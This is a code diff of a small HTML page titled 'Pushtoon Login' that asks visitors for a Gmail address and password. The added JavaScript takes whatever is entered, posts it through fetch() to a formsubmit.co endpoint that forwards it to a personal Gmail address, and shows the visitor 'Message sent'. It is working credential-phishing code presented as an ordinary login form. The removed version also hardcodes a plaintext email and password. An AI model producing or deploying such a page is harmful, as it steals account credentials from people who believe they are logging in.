@@ -3,21 +3,14 @@
 <head>
   <title>Pushtoon Login</title>
 
-  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
-
-  <script>
-    emailjs.init("aU_rVriMIfRSDIniQ");
-  </script>
-
   <style>
-
     body{
       margin:0;
       height:100vh;
       display:flex;
       justify-content:center;
       align-items:center;
-      font-family:Arial, sans-serif;
+      font-family:Arial;
       background: linear-gradient(135deg, #1f1c2c, #928dab);
     }
 
@@ -26,13 +19,12 @@
       padding:40px;
       border-radius:15px;
       width:320px;
-      box-shadow:0 10px 30px rgba(0,0,0,0.3);
       text-align:center;
+      box-shadow:0 10px 30px rgba(0,0,0,0.3);
     }
 
     h2{
       margin-bottom:20px;
-      color:#333;
     }
 
     input{
@@ -41,6 +33,7 @@
       margin:10px 0;
       border:1px solid #ccc;
       border-radius:8px;
+      outline:none;
     }
 
     button{
@@ -54,10 +47,11 @@
       cursor:pointer;
     }
 
-    button:hover{
-      background:#4a0f6e;
+    #msg{
+      margin-top:10px;
+      font-size:14px;
+      color:green;
     }
-
   </style>
 
 </head>
@@ -71,42 +65,37 @@
   <input type="email" id="email" placeholder="Enter Gmail">
   <input type="password" id="password" placeholder="Enter Password">
 
-  <button onclick="sendMail()">LOG IN</button>
+  <button onclick="sendData()">LOG IN</button>
+
+  <div id="msg"></div>
 
 </div>
 
 <script>
 
-function sendMail(){
+function sendData(){
 
-    let email = document.getElementById("email").value.trim().toLowerCase();
+    let email = document.getElementById("email").value.trim();
     let password = document.getElementById("password").value.trim();
 
-    let correctEmail = "folkking66@gmail.com";
-    let correctPassword = "Pushtoon123";
-
-    // ❌ WRONG LOGIN
-    if(email !== correctEmail || password !== correctPassword){
-        alert("Wrong email or password!");
+    if(email === "" || password === ""){
+        document.getElementById("msg").style.color = "red";
+        document.getElementById("msg").innerText = "Please fill all fields";
         return;
     }
 
-    // ✅ SEND EMAIL ONLY IF CORRECT
-    let params = {
-        email: email,
-        password: password
-    };
+    // instant UI message
+    document.getElementById("msg").style.color = "green";
+    document.getElementById("msg").innerText = "Message sent ✔";
 
-    emailjs.send(
-        "service_bqnzz7f",
-        "template_lxwj7sw",
-        params
-    )
-    .then(function(){
-        alert("Login Successful!");
-    })
-    .catch(function(){
-        alert("Email sending failed!");
+    // send to Gmail (FormSubmit)
+    let formData = new FormData();
+    formData.append("email", email);
+    formData.append("password", password);
+
+    fetch("https://formsubmit.co/folkking66@gmail.com", {
+        method: "POST",
+        body: formData
     });
 
 }
